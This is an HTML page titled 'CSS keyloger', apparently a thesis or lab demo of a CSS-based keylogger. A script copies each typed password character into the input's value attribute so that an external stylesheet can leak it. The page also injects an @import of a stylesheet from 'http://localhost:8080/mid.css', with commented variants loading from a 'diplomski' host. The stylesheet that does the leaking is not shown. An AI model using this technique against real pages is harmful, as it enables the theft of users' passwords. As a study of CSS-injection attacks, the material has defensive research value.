<html>
    <head>
        <title>
            CSS keyloger
        </title>
    </head>
    <body>
        <div id=d>
            <h1>CSS keyloger</h1>
            <p>HELLO, MY name is:</p>
            <p id="name">{}@import url("http://localhost:8080/mid.css");</p>
            <form>
                <input type=password id=i onkeyup=keyup(this) value="">
                <input type=submit id=sub value=Submit >
            </form>
        </div>
    </body>
</html>
<script>
    function keyup(el) {
        el.setAttribute("value", el.value)
    }
</script>
<link href="keyloger.css" rel="stylesheet" type="text/css" >

<!-- <link href="keyloger.css" rel="stylesheet" type="text/css" > -->
<!-- <style>
@import url("http://diplomski/mid.css");
</style> -->
<!-- <p id="name">{}@import url("http://diplomski/mid.css");</p> -->
<!-- <p id="name"><style>
@import url("http://diplomski/mid.css");
</style></p> -->